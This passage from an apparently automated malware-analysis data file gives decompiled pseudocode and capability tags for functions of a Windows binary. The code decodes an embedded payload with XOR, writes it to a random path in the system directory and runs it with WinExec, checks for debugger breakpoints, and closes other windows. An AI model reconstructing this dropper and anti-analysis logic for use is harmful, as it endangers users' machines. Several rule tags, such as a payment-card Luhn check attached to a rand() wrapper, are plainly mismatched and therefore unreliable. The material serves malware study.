= puVar13 + -1;\n            *puVar13 = *puVar12;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    if (piVar3[0x16] != 0) {\n        return 0;\n    }\n    puVar11 = &stack0xfffffffc;\n    if ((unaff_BX != 0) && (puVar11 = &stack0xfffffffc,  unaff_BX == 0)) {\n        puVar12 = &uStack21;\n        puVar11 = &uStack21;\n        cVar1 = '\\x10';\n        do {\n            puVar13 = puVar13 + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *puVar13;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    uVar9 = *(*(puVar11 + 8) + 0x3c) - 0x80;\n    if (0xbf < *(*(puVar11 + 8) + 0x3c)) {\n        uVar9 = *(puVar11 + -4);\n    }\n    uStack21._0_1_ = uVar9;\n    uStack21._1_1_ = uVar9 >> 8;\n    uStack21._2_2_ = uVar9 >> 0x10;\n    uVar19 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    puVar12 = uVar19;\n    *(puVar11 + -4) = puVar12;\n    if (puVar12 == NULL) {\n        return 0;\n    }\n    uVar10 = 0;\n    bVar14 = false;\n    bVar15 = false;\n    iVar7 = extraout_ECX;\n    Var16 = extraout_ST0;\n    Var17 = extraout_ST1;\n    uVar8 = uVar9;\n    if (uVar9 != 0) {\n        do {\n            piVar3 = uVar19 >> 0x20;\n            if ((bVar15 == uVar8 < 0) && (bVar15 != uVar8 < 0)) {\n                *(uVar19 + -0x7ce92414) = Var16;\n                uVar5 = uVar19 - 1;\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar2 = uVar5 + in_AF * '\\x06';\n                uVar8 = uVar5 & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | bVar14 | in_AF * (0xf9 < uVar2)) * '`';\n                *piVar3 = *piVar3 + 0x15ffdf84;\n                *(iVar7 + 0x40) = *(iVar7 + 0x40) + (uVar5 >> 8);\n                *(iVar7 + 0xffb9) = *(iVar7 + 0xffb9) + uVar10;\n                uVar5 = uVar10 & 0xffff0000 | CONCAT11((uVar10 >> 8) + (uVar19 >> 0x28), uVar10);\n                Var18 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n                uStack17 = uVar10;\n            }\n            else {\n                uStack21._0_1_ = 0x9a;\n                uStack21._1_1_ = 0x2b;\n                uStack21._2_2_ = 0x40;\n                Var18 = in_ST2;\n                iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n                iVar7 = 0xff;\n                uVar8 = iVar6 / 0xff;\n                piVar3 = iVar6 % 0xff;\n                uVar5 = uVar10;\n                Var17 = extraout_ST0_00;\n                in_ST2 = extraout_ST1_00;\n            }\n            uVar19 = CONCAT44(piVar3, uVar8);\n            uVar10 = uVar5 + 1;\n            bVar14 = uVar10 < uVar9;\n            bVar15 = SBORROW4(uVar10, uVar9);\n            uVar8 = uVar10 - uVar9;\n            *(uVar5 + puVar12) = piVar3;\n            Var16 = Var17;\n            Var17 = in_ST2;\n            in_ST2 = Var18;\n        } while (bVar14);\n    }\n    puVar13 = *(puVar11 + 8) + 0x80;\n    for (uVar8 = uVar9 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar13 = *puVar12;\n        puVar12 = puVar12 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar9 = uVar9 & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar13 = *puVar12;\n        puVar12 = puVar12 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    uVar4 = *(puVar11 + -4);\n    uStack21._0_1_ = uVar4;\n    uStack21._1_1_ = uVar4 >> 8;\n    uStack21._2_2_ = uVar4 >> 0x10;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    return 1;\n}\n",
        "token_count": 1993
    },
    "00403010": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403010(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x424600 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404eb0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x424440, acStack1304, &uStack2112);\n    uStack2088 = 0x4244c8;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4244e0;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402740(auStack1564, 0x42443c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00404800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404835)\n\nbool __cdecl fcn.00404800(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401580();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401840();\n        arg_ch_01 = fcn.00401840();\n        arg_ch_02 = fcn.00401840();\n        fcn.00404eb0(arg_10h, arg_ch_00);\n        fcn.00404eb0(arg_8h, arg_ch_01);\n        fcn.00404eb0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x424180, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402f80(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x42418c, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402f80(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x42418c, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402f80(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404eb0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 629
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    // [00] -r-x section size 20480 named .text\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401090(&var_68h, &var_4h);\n    fcn.00402c80(&var_68h, var_4h, 0x407010, 0xa140);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa140;\n    return;\n}\n",
        "token_count": 253
    },
    "00401580": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00401580(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4245f8 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4245f8 = 1;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00401840": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401840(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00402740": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402740(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 131
    },
    "00402c80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402c80(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar1 = var_8h + 1;\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = uVar1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00403860": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004038bb) overlaps instruction at (ram,0x004038b9)\n// \n// WARNING: Removing unreachable block (ram,0x004038d6)\n// WARNING: Removing unreachable block (ram,0x004038d8)\n// WARNING: Removing unreachable block (ram,0x004038bb)\n\nbool fcn.00403860(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint var_4h;\n    \n    pvData = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4245bc, 0x4245e4, &pdwType, &pvData, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 425
    },
    "00403a20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403abb) overlaps instruction at (ram,0x00403ab9)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403a20(int32_t *hWnd)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint8_t extraout_DL;\n    uint *puVar8;\n    uint *in_FS_OFFSET;\n    bool bVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4050e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x424554);\n    if (iVar3 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar3;\n    uVar4 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x424560);\n    bVar9 = false;\n    iVar5 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar4, 0, 0, 2, 1000, &lpdwResult);\n    if ((bVar9) || (!bVar9)) {\n        pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x424574);\n    }\n    else {\n        puVar1 = iVar3 + -1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + extraout_DL;\n        pcVar6 = iVar5 + 0x4285d4b4 + CARRY1(uVar2, extraout_DL);\n    }\n    if (pcVar6 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar5 = (*pcVar6)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar5 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar5 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar5 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar5 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar5 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00403e45:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00403e51:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar5 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar5 < 0) || (var_10h == NULL)) ||\n                       (iVar5 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar5 < 0)) {\njoined_r0x00403e0c:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00403e51;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403c48:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403830(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x424588);\n                        if (iVar3 != 0) goto joined_r0x00403c48;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar5 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar5 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00403df1:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00403e45;\n                        }\n                        iVar5 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar3 = var_3ch;\n                        if (iVar5 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00403df1;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar8 = &var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar8 = 0;\n                                puVar8 = puVar8 + 1;\n                            }\n                            *puVar8 = 0;\n                            *(puVar8 + 2) = 0;\n                            fcn.00403830(iVar3, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar3 = fcn.00403950(&var_148h);\n                            if (iVar3 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00403e0c;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar3 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar3 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar5;\n}\n",
        "token_count": 2609
    },
    "00403f70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404027) overlaps instruction at (ram,0x00404026)\n// \n\nuint __cdecl fcn.00403f70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    if (*0x10 != 0x10c) {\n        if (*0x10 == 0x10c) goto code_r0x00403f85;\n    }\n    unaff_ESI = arg_8h;\ncode_r0x00403f85:\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(0x47);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar3 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(unaff_ESI, &var_108h, 0x104);\n    uVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x424530);\n    piVar2 = uVar5 >> 0x20;\n    bVar4 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n    if (uVar5 != 0) {\n        return 1;\n    }\n    if ((bVar4) || (!bVar4)) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(unaff_ESI, 0x403ef0, 0);\n    }\n    else {\n        *piVar2 = *piVar2 + -0x68;\n        LOCK();\n        *(unaff_ESI + -1) = *(unaff_ESI + -1) + (uVar5 >> 0x20);\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(unaff_ESI, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 600
    },
    "00404eb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404eb0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 173
    },
    "00401090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011af) overlaps instruction at (ram,0x004011aa)\n// \n// WARNING: Removing unreachable block (ram,0x004010b6)\n\nvoid __fastcall fcn.00401090(int32_t param_1, uint32_t *param_2, uint *param_3, uint *param_4)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t unaff_EDI;\n    uchar in_ZF;\n    bool bVar5;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    uchar auStackY108 [76];\n    uint uStackY32;\n    \n    puVar3 = &stack0xfffffffc;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(unaff_EDI | &stack0xfffffffc) = in_EAX;\n        in_OF = '\\0';\n        param_2 = param_2 & 0xffffff00;\n        uVar2 = in_EAX + (in_EAX >> 8) * 'y';\n        in_EAX = in_EAX & 0xffff0000 | uVar2;\n        in_SF = '\\0';\n        in_ZF = uVar2 == 0;\n    }\n    *param_3 = 0x51;\n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (param_1 == 0) {\n            fcn.00401090();\n            uStackY32 = 0x40106e;\n            fcn.00402c80(&stack0xffffff94, unaff_EBX, 0x407010, 0xa140);\n            *param_3 = 0x407010;\n            *param_4 = 0xa140;\n            return;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    